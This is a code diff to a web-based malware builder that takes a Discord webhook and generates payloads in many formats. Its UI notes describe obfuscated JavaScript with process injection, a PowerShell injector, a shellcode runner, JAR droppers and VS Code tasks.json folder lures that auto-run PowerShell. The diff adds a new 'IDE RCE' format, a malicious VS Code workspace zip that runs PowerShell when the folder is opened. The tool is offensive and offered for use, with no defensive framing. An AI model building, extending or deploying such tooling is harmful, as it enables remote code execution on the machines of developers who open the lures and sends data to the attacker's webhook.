@@ -8,6 +8,7 @@ import { buildBat } from "./formats/bat.js";
 import { buildTasksJson } from "./formats/tasks.js";
 import { buildDonut } from "./formats/donut.js";
 import { buildJar } from "./formats/jar.js";
+import { buildIdeTaskRce } from "./formats/ide_task.js";
 
 const PORT    = parseInt(process.env.BROWSER_BUILDER_PORT || "5176");
 const HOST    = process.env.HOST || "0.0.0.0";
@@ -107,6 +108,9 @@ button[type=submit]:disabled{opacity:.5;cursor:default;transform:none;box-shadow
       <div class="fmt" data-fmt="kit">
         <div class="icon">&#x1F4E6;</div>Kit (.zip)
       </div>
+      <div class="fmt" data-fmt="ide">
+        <div class="icon">&#x26A1;</div>IDE RCE
+      </div>
     </div>
 
     <label>Output Filename</label>
@@ -120,8 +124,8 @@ button[type=submit]:disabled{opacity:.5;cursor:default;transform:none;box-shadow
 <script>
 var fmtEl = document.querySelectorAll('.fmts .fmt, .fmts2 .fmt');
 var selectedFmt = 'js';
-var exts = {js:'js',ps1:'ps1',bat:'bat',exe:'exe',donut:'py',jar:'jar',tasks:'tasks.json',kit:'zip'};
-var defaults = {js:'update.js',ps1:'update.ps1',bat:'update.bat',exe:'update.exe',donut:'donut.py',jar:'update.jar',tasks:'tasks.json',kit:'kit.zip'};
+var exts = {js:'js',ps1:'ps1',bat:'bat',exe:'exe',donut:'py',jar:'jar',tasks:'tasks.json',kit:'zip',ide:'zip'};
+var defaults = {js:'update.js',ps1:'update.ps1',bat:'update.bat',exe:'update.exe',donut:'donut.py',jar:'update.jar',tasks:'tasks.json',kit:'kit.zip',ide:'workspace.zip'};
 var notes = {
   js:'JS: obfuscated + polymorphic names + process injection.',
   ps1:'PS1: PowerShell retrieval + process injection via C# Add-Type.',
@@ -130,7 +134,8 @@ var notes = {
   donut:'Donut SC: Python ctypes shellcode runner. Resolves WinExec at runtime, injects x64 stub.',
   jar:'JAR: Java launcher. Drops PS1 to temp + runs hidden. No Java source needed at runtime.',
   tasks:'tasks.json: VS Code folder lure. Auto-runs PS1 one-liner on folder open.',
-  kit:'Kit: ZIP containing PS1 + BAT + tasks.json + JAR (all formats bundled).'
+  kit:'Kit: ZIP containing PS1 + BAT + tasks.json + JAR (all formats bundled).',
+  ide:'IDE RCE: Malicious VS Code workspace. Triggers PowerShell RCE on folder open.'
 };
 fmtEl.forEach(function(b){
   b.addEventListener('click',function(){
@@ -184,7 +189,7 @@ const server = Bun.serve({
       if (!webhook.startsWith("https://discord.com/api/webhooks/"))
         return Response.json({ error: "Invalid Discord webhook URL" }, { status: 400 });
 
-      const VALID_FORMATS = new Set(["js","ps1","bat","exe","donut","jar","tasks","kit"]);
+      const VALID_FORMATS = new Set(["js","ps1","bat","exe","donut","jar","tasks","kit","ide"]);
       const format: string = VALID_FORMATS.has(body?.format) ? body.format : "js";
       const filename: string = (body?.filename || "update.js")
         .replace(/[^\w\-. ]/g, "_").slice(0, 64);
@@ -198,6 +203,7 @@ const server = Bun.serve({
         jar:   "application/java-archive",
         tasks: "application/json",
         kit:   "application/zip",
+        ide:   "application/zip",
       };
 
       try {
@@ -216,6 +222,8 @@ const server = Bun.serve({
         } else if (format === "kit") {
           const { buildKit } = await import("./formats/kit.js");
           output = await buildKit(webhook);
+        } else if (format === "ide") {
+          output = await buildIdeTaskRce(webhook);
         } else if (format === "exe") {
           // Lazy-load exe builder (heavy pkg dependency)
           const { buildExe } = await import("./formats/exe.js");
